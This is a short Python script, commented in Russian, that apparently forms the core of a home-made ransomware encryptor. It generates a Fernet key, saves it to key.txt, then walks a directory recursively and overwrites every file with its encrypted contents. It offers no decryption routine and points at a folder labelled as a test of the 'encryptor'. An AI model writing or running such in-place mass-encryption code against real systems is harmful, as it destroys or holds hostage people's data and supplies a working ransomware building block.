from cryptography.fernet import Fernet
import os


def do_key(patch_to_key):

    # Создаем ключ шифрования
    key = Fernet.generate_key()

    # Сохраним его на рабочем столе
    with open(patch_to_key, "wb") as key_file:
        key_file.write(key)

    return key


# Функция шифрования файла по указанному пути
def encrypt(patch, key, walk = False):

    # Пройдемся по всему каталогу
    if walk is True:
        list = os.listdir(patch)

        for file_name in list:

            if os.path.isfile(patch + '\\' + file_name):
                encrypt(patch + '\\' + file_name, key, False)
            else:
                encrypt(patch + '\\' + file_name, key, True)
    else:
        fer = Fernet(key)

        # Вытаскиваем данные из файла
        with open(patch, "rb") as file:
            data_file = file.read()

        # Шифруем данные
        encrypted_data = fer.encrypt(data_file)

        # Возращаем данные на место
        with open(patch, "wb") as file:
            file.write(encrypted_data)


adress = "C:\Программирование\Python\Шифровальщик\Проверка шифровальщика"
adress_to_key = "key.txt"

if os.path.isfile(adress) is True:
    walk = False
else:
    walk = True

key = do_key(adress_to_key)
encrypt(adress, key, walk)
